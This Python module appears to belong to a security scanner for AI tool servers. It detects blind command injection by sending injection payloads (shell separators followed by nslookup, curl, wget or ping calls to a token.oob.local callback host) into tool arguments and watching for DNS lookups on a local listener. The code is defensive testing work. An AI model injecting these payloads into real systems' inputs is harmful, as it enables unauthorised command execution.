"""Out-of-Band detection via DNS exfiltration"""
import threading
import uuid
import time
from socketserver import ThreadingUDPServer, DatagramRequestHandler


class OOBTest:
    """Detect OOB data exfiltration via DNS queries"""
    
    def __init__(self, pentester):
        self.pentester = pentester
        self.dns_server = None
        self.dns_port = 5353
        self.captured_queries = {}
        
    DNS_PAYLOADS = [
        # Command substitution with DNS
        "; nslookup {token}.oob.local 127.0.0.1",
        "| nslookup {token}.oob.local 127.0.0.1",
        "$(nslookup {token}.oob.local 127.0.0.1)",
        "`nslookup {token}.oob.local 127.0.0.1`",
        # Curl DNS exfil
        "; curl http://{token}.oob.local",
        "| curl http://{token}.oob.local",
        # Wget DNS exfil
        "; wget http://{token}.oob.local",
        "| wget http://{token}.oob.local",
        # Ping DNS (Windows/Unix)
        "; ping -c 1 {token}.oob.local",
        "& ping -n 1 {token}.oob.local",
    ]
    
    def _start_dns_listener(self):
        """Start DNS listener to capture queries"""
        parent = self
        
        class DNSHandler(DatagramRequestHandler):
            def handle(self):
                data = self.request[0]
                if len(data) > 12:
                    query = self._parse_dns_query(data)
                    if query:
                        for token in parent.captured_queries:
                            if token in query:
                                parent.captured_queries[token] = {
                                    'query': query,
                                    'source': self.client_address,
                                    'time': time.time()
                                }
            
            def _parse_dns_query(self, data):
                try:
                    labels = []
                    i = 12
                    while i < len(data) and data[i] != 0:
                        length = data[i]
                        if length == 0 or i + length >= len(data):
                            break
                        labels.append(data[i+1:i+1+length].decode('ascii', errors='ignore'))
                        i += length + 1
                    return '.'.join(labels) if labels else None
                except (IndexError, UnicodeDecodeError):
                    return None
        
        self.dns_server = ThreadingUDPServer(('0.0.0.0', self.dns_port), DNSHandler)
        thread = threading.Thread(target=self.dns_server.serve_forever, daemon=True)
        thread.start()
    
    def run(self, tool):
        """Test tool for OOB DNS exfiltration"""
        self.pentester.health_check()
        findings = []
        
        if not self.dns_server:
            self._start_dns_listener()
        
        schema = tool.get('inputSchema', {})
        test_args = self._find_injectable_args(schema)
        
        for arg in test_args:
            for payload_template in self.DNS_PAYLOADS:
                token = str(uuid.uuid4())[:8]
                self.captured_queries[token] = None
                payload = payload_template.format(token=token)
                
                try:
                    params = {"name": tool['name'], "arguments": {arg: payload}}
                    self.pentester.send("tools/call", params)
                    
                    time.sleep(2)
                    
                    if self.captured_queries.get(token):
                        findings.append({
                            'type': 'OOB_DNS',
                            'tool': tool['name'],
                            'arg': arg,
                            'payload': payload,
                            'dns_query': self.captured_queries[token]['query'],
                            'severity': 'CRITICAL'
                        })
                except Exception:
                    pass
        
        return findings
    
    def _find_injectable_args(self, schema):
        """Find arguments likely injectable"""
        return list(schema.get('properties', {}).keys())
    
    def cleanup(self):
        """Stop DNS listener"""
        if self.dns_server:
            self.dns_server.shutdown()
